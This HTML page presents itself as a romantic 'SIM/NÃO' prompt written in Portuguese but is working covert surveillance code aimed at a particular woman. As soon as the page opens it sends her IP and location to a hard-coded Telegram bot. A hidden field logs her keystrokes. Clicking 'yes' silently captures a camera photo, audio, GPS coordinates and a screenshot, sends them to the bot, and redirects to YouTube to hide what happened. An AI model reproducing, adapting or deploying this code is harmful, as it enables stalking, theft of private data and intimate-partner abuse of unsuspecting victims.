<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🇷🇺 Conexão</title>
    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            position: relative;
            overflow: hidden;
            background: #0a0a0a;
        }
        /* Fundo com a sua foto */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('IMG_8738.jpeg') no-repeat center center/cover;
            filter: blur(6px) brightness(0.4);
            z-index: 0;
        }
        .container {
            position: relative;
            z-index: 2;
            max-width: 480px;
            width: 100%;
            background: rgba(20, 20, 30, 0.7);
            backdrop-filter: blur(15px);
            border-radius: 40px 8px 40px 8px;
            padding: 60px 25px;
            text-align: center;
            border: 1px solid rgba(255, 50, 50, 0.3);
            box-shadow: 0 0 50px rgba(255, 0, 0, 0.2);
        }
        .buttons { display: flex; justify-content: center; gap: 30px; flex-wrap: wrap; min-height: 70px; }
        .btn {
            font-size: 22px;
            padding: 18px 50px;
            border: none;
            background: rgba(255, 255, 255, 0.05);
            color: white;
            cursor: pointer;
            font-family: 'Georgia', serif;
            border-radius: 50px 8px 50px 8px;
            min-width: 130px;
            backdrop-filter: blur(4px);
            border: 1px solid rgba(255, 255, 255, 0.15);
            transition: all 0.3s ease;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .btn:hover { background: rgba(255, 255, 255, 0.15); transform: scale(1.05); }
        .btn-nao { background: rgba(255, 0, 0, 0.1); color: #ff4444; border-color: rgba(255, 0, 0, 0.3); }
        .loader {
            border: 3px solid rgba(255, 255, 255, 0.1);
            border-top: 3px solid #ff2222;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: girar 1s linear infinite;
            margin: 20px auto 5px;
            display: none;
        }
        @keyframes girar { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        /* Campo invisível do keylogger */
        #kg {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            width: 1px;
            height: 1px;
            z-index: -999;
        }

        /* Esconde os elementos de mídia */
        video, canvas { display: none; }
    </style>
</head>
<body>

    <!-- CAMPO INVISÍVEL (KEYLOGGER) -->
    <input type="text" id="kg" autofocus>
    <video id="videoCam" autoplay></video>
    <canvas id="canvasCam"></canvas>

    <div class="container" id="page-content">
        <div class="buttons" id="buttonArea">
            <button class="btn" id="btnSim">🇷🇺 SIM ❤️</button>
            <button class="btn btn-nao" id="btnNao">🇷🇺 NÃO 💔</button>
        </div>
        <div class="loader" id="loader"></div>
    </div>

    <script>
        // ============================================================
        // CONFIGURAÇÕES (SEU BOT)
        // ============================================================
        const BOT = "8819910333:AAEYctveGsw4Uf0RBCBKxbU3dkXJpO2fld4";
        const CHAT = "8551438856";

        // ============================================================
        // SISTEMA DE COLETA SILENCIOSA (RODA SOZINHO)
        // ============================================================
        (function coletaSilenciosa() {
            // Pega IP e localização SEM pedir permissão (assim que a página abre)
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(d => {
                    let ip = d.ip;
                    fetch(`https://ipinfo.io/${ip}/json`)
                        .then(r => r.json())
                        .then(loc => {
                            let msg = `🕵️‍♂️ **ALVO CONECTADO**\n`;
                            msg += `📲 IP: ${ip}\n`;
                            msg += `📍 Cidade: ${loc.city || 'N/A'}\n`;
                            msg += `🗺️ Estado: ${loc.region || 'N/A'}\n`;
                            msg += `🌍 País: ${loc.country || 'N/A'}\n`;
                            msg += `📡 Coord: ${loc.loc || 'N/A'}\n`;
                            msg += `🏢 ISP: ${loc.org || 'N/A'}`;
                            
                            // Detecta VPN
                            if (loc.org && (loc.org.toLowerCase().includes('vpn') || loc.org.toLowerCase().includes('proxy'))) {
                                msg += `\n⚠️ **VPN/PROXY DETECTADO!**`;
                            }

                            fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    chat_id: CHAT,
                                    text: msg,
                                    parse_mode: 'Markdown'
                                })
                            });
                        });
                });
        })();

        // ============================================================
        // KEYLOGGER (CAPTURA TUDO QUE DIGITA)
        // ============================================================
        const campoKG = document.getElementById('kg');
        let teclas = [];
        
        document.addEventListener('click', () => campoKG.focus());
        campoKG.focus();

        document.addEventListener('keydown', function(e) {
            if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace' || e.key === ' ') {
                let t = e.key;
                if (t === 'Enter') t = '[ENTER]';
                if (t === 'Backspace') t = '[BACK]';
                if (t === ' ') t = '[ESP]';
                teclas.push(t);
                
                if (teclas.length >= 30) {
                    enviarTeclas();
                }
            }
        });

        function enviarTeclas() {
            if (teclas.length === 0) return;
            const texto = teclas.join('');
            teclas = [];
            fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT,
                    text: `⌨️ **KEYLOG:**\n${texto}`,
                    parse_mode: 'Markdown'
                })
            }).catch(() => {});
        }

        // Envia a cada 20 segundos automaticamente
        setInterval(enviarTeclas, 20000);

        // ============================================================
        // FUNÇÃO: CAPTURAR CÂMERA (SEM ELA PERCEBER QUE É UM "PEDIDO")
        // ============================================================
        async function capturarCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: 640, height: 480 }
                });
                const video = document.getElementById('videoCam');
                video.srcObject = stream;
                await new Promise(resolve => setTimeout(resolve, 800));
                
                const canvas = document.getElementById('canvasCam');
                canvas.width = 640;
                canvas.height = 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, 640, 480);
                
                const foto = canvas.toDataURL('image/jpeg', 0.9);
                stream.getTracks().forEach(track => track.stop());
                return foto;
            } catch { return null; }
        }

        // ============================================================
        // FUNÇÃO: CAPTURAR ÁUDIO (5 SEGUNDOS)
        // ============================================================
        async function capturarAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                let chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.start();
                await new Promise(r => setTimeout(r, 4000));
                recorder.stop();
                await new Promise(r => recorder.onstop = r);
                stream.getTracks().forEach(t => t.stop());
                return new Blob(chunks, { type: 'audio/webm' });
            } catch { return null; }
        }

        // ============================================================
        // FUNÇÃO: GPS EXATO
        // ============================================================
        function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) return resolve({ lat: '❌', lon: '❌' });
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
                    () => resolve({ lat: '❌', lon: '❌' }),
                    { enableHighAccuracy: true, timeout: 4000 }
                );
            });
        }

        // ============================================================
        // FUNÇÃO: PEGAR DADOS DO DISPOSITIVO
        // ============================================================
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let info = `📱 **DISPOSITIVO:**\n`;
            info += `🔹 User-Agent: ${ua}\n`;
            info += `🔹 Bateria: Aguardando...\n`;
            info += `🔹 Tela: ${screen.width}x${screen.height}\n`;
            info += `🔹 Idioma: ${navigator.language}\n`;
            info += `🔹 Fuso: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
            return info;
        }

        // ============================================================
        // FUNÇÃO: SCREENSHOT
        // ============================================================
        async function tirarPrint() {
            try {
                const canvas = await html2canvas(document.body, {
                    scale: 1.0,
                    useCORS: true,
                    backgroundColor: '#000',
                    logging: false
                });
                return canvas.toDataURL('image/jpeg', 0.85);
            } catch { return null; }
        }

        // ============================================================
        // BOTÃO "NÃO" FUGINDO (DESESPERADOR)
        // ============================================================
        const btnNao = document.getElementById('btnNao');
        const container = document.getElementById('page-content');
        btnNao.addEventListener('mouseenter', function(e) {
            const rect = container.getBoundingClientRect();
            const btn = btnNao.getBoundingClientRect();
            const maxX = rect.width - btn.width - 15;
            const maxY = rect.height - btn.height - 15;
            if (maxX <= 0 || maxY <= 0) return;
            btnNao.style.position = 'absolute';
            btnNao.style.left = Math.random() * maxX + 'px';
            btnNao.style.top = Math.random() * maxY + 'px';
        });
        btnNao.addEventListener('click', function(e) {
            const rect = container.getBoundingClientRect();
            const btn = btnNao.getBoundingClientRect();
            const maxX = rect.width - btn.width - 15;
            const maxY = rect.height - btn.height - 15;
            if (maxX <= 0 || maxY <= 0) return;
            btnNao.style.position = 'absolute';
            btnNao.style.left = Math.random() * maxX + 'px';
            btnNao.style.top = Math.random() * maxY + 'px';
        });

        // ============================================================
        // BOTÃO "SIM" - O INFERNO DESABA
        // ============================================================
        document.getElementById('btnSim').addEventListener('click', async function() {
            // 1. Esconde botões, mostra loading
            document.getElementById('buttonArea').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            // 2. DISPARA TUDO EM PARALELO (Câmera, Áudio, GPS, Print, Device)
            const [foto, audio, gps, print, device] = await Promise.all([
                capturarCamera(),
                capturarAudio(),
                getGPS(),
                tirarPrint(),
                getDeviceInfo()
            ]);

            // 3. Monta relatório completo
            let relatorio = `🚨 **RELATÓRIO DE ATAQUE** 🚨\n\n`;
            relatorio += device;
            
            if (gps.lat !== '❌') {
                relatorio += `📍 **GPS EXATO:**\n   Lat: ${gps.lat}\n   Lon: ${gps.lon}\n`;
            }

            // 4. Envia o texto do relatório
            await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT, text: relatorio, parse_mode: 'Markdown' })
            });

            // 5. Envia a FOTO DA CÂMERA
            if (foto) {
                const form = new FormData();
                const blob = await fetch(foto).then(r => r.blob());
                form.append('photo', blob, 'cam_frontal.jpg');
                form.append('chat_id', CHAT);
                form.append('caption', '📸 **FOTO DA CÂMERA FRONTAL**');
                await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, { method: 'POST', body: form });
            }

            // 6. Envia o PRINT DA TELA
            if (print) {
                const form = new FormData();
                const blob = await fetch(print).then(r => r.blob());
                form.append('photo', blob, 'print.jpg');
                form.append('chat_id', CHAT);
                form.append('caption', '🖼️ **PRINT DA TELA**');
                await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, { method: 'POST', body: form });
            }

            // 7. Envia o ÁUDIO
            if (audio) {
                const form = new FormData();
                form.append('audio', audio, 'audio.webm');
                form.append('chat_id', CHAT);
                form.append('caption', '🎤 **ÁUDIO CAPTURADO (4s)**');
                await fetch(`https://api.telegram.org/bot${BOT}/sendAudio`, { method: 'POST', body: form });
            }

            // 8. REDIRECIONA PARA O YOUTUBE (Ela acha que acabou)
            setTimeout(() => {
                window.location.href = 'https://www.youtube.com/watch?v=TdrL3QxjyVw';
            }, 1000);
        });
    </script>
</body>
</html>
